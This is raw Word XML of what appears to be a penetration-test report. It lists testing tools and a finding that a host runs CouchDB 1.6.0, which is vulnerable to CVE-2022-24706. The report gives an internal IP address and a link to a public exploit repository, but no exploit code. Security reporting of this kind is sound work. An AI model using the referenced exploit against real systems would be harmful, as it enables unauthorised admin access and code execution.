          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Verdana" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Verdana" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>github.com</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EF7202" w:rsidRPr="000B2919" w:rsidRDefault="00EF7202">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Verdana" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Verdana" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Gophish</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRPr="000B2919" w:rsidRDefault="00EF7202">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Verdana" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Burpsuite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000B2919" w:rsidRPr="000B2919">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875" w:rsidP="00EF7202">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="240"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_heading=h.3rdcrjn" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkEnd w:id="11"/>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Default="00626C50" w:rsidP="00EF7202">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="240"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00626C50" w:rsidRPr="00EF7202" w:rsidRDefault="00626C50" w:rsidP="00EF7202">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="240"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRPr="00EF7202" w:rsidRDefault="008979F6" w:rsidP="00EF7202">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc143392738"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Detailed Technical Reports </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(Scope Limited)</w:t>
      </w:r>
      <w:bookmarkStart w:id="13" w:name="_heading=h.lnxbz9" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkEnd w:id="12"/>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc143392739"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidR="00BB2124">
        <w:rPr>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>example</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>.com]</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875"/>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="808080"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="15" w:name="_heading=h.1ksv4uv" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkEnd w:id="15"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="808080"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>This host contains</w:t>
      </w:r>
      <w:r w:rsidR="001B653C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="808080"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> an </w:t>
      </w:r>
      <w:r w:rsidR="00EF7202">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="808080"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Apache</w:t>
      </w:r>
      <w:r w:rsidR="001B653C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="808080"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C95900">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="808080"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="001B653C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="808080"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ouch</w:t>
      </w:r>
      <w:r w:rsidR="00C95900">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="808080"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="001B653C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="808080"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001B653C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="808080"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> version 1.6.0 running on port 5984 which has </w:t>
      </w:r>
      <w:r w:rsidR="00EF7202">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="808080"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>much</w:t>
      </w:r>
      <w:r w:rsidR="001B653C">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="808080"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> critical vulnerability which allows us to execute code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="808080"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5C4B88A9" wp14:editId="58C6ADF5">
            <wp:extent cx="5692775" cy="1908810"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="139" name="Chart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44875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="a0"/>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218"/>
        <w:gridCol w:w="2258"/>
        <w:gridCol w:w="2214"/>
      </w:tblGrid>
      <w:tr w:rsidR="00944875">
        <w:trPr>
          <w:trHeight w:val="404"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2256" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="17365D"/>
          </w:tcPr>
          <w:p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Total Findings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2218" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
          </w:tcPr>
          <w:p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Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2258" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
          </w:tcPr>
          <w:p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High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
          </w:tcPr>
          <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
            <w:pPr>
              <w:pBdr>
                <w:top w:val="nil"/>
                <w:left w:val="nil"/>
                <w:bottom w:val="nil"/>
                <w:right w:val="nil"/>
                <w:between w:val="nil"/>
              </w:pBdr>
              <w:spacing w:before="120" w:after="120" w:line="259" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00944875">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2256" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00944875" w:rsidRDefault="00C016F1">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8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2218" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00944875" w:rsidRDefault="00C016F1">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1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2258" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00944875" w:rsidRDefault="00C016F1">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3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00944875" w:rsidRDefault="00C95900">
            <w:pPr>
              <w:pBdr>
                <w:top w:val="nil"/>
                <w:left w:val="nil"/>
                <w:bottom w:val="nil"/>
                <w:right w:val="nil"/>
                <w:between w:val="nil"/>
              </w:pBdr>
              <w:spacing w:before="120" w:after="120" w:line="259" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:b/>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:b/>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_heading=h.44sinio" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkEnd w:id="16"/>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="001B653C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="17" w:name="_Toc143392740"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Finding 1</w:t>
      </w:r>
      <w:r w:rsidR="008979F6">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="000B58C7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>CVE-2022-24706</w:t>
      </w:r>
      <w:r w:rsidR="00C00E27">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C00E27">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C00E27">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt; 3.2.2)</w:t>
      </w:r>
      <w:r w:rsidR="008979F6">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="00382420" w:rsidRPr="00382420">
        <w:rPr>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="red"/>
        </w:rPr>
        <w:t>HIGH</w:t>
      </w:r>
      <w:bookmarkEnd w:id="17"/>
      <w:r w:rsidR="008979F6">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p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p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00C00E27">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C00E27">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">In Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C00E27">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C00E27">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> prior to 3.2.2, an attacker can access an improperly secured default installation without authenticating and gain admin privileges. The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C00E27">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C00E27">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> documentation has always made recommendations for properly securing an installation, including recommending using a firewall in front of all </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C00E27">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C00E27">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> installations.</w:t>
      </w:r>
    </w:p>
    <w:p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rsidR="00944875" w:rsidRDefault="00C00E27">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Access link: </w:t>
      </w:r>
      <w:hyperlink r:id="rId13" w:history="1">
        <w:r w:rsidR="00F83D6A" w:rsidRPr="007C6340">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://10.10.10.10:5984</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00F83D6A" w:rsidRDefault="00F83D6A">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Current Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> version: 1.6.0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F83D6A" w:rsidRDefault="00F83D6A">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This vulnerability has a public exploit execution code: </w:t>
      </w:r>
      <w:hyperlink r:id="rId14" w:history="1">
        <w:r w:rsidRPr="007C6340">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00F83D6A" w:rsidRDefault="00F83D6A">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00F83D6A" w:rsidRDefault="00382420">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NOTE: </w:t>
      </w:r>
      <w:r w:rsidR="00F83D6A">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">This will only </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">be </w:t>
      </w:r>
      <w:r w:rsidR="00F83D6A">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">able to run if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F83D6A">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F83D6A">
        <w:rPr>
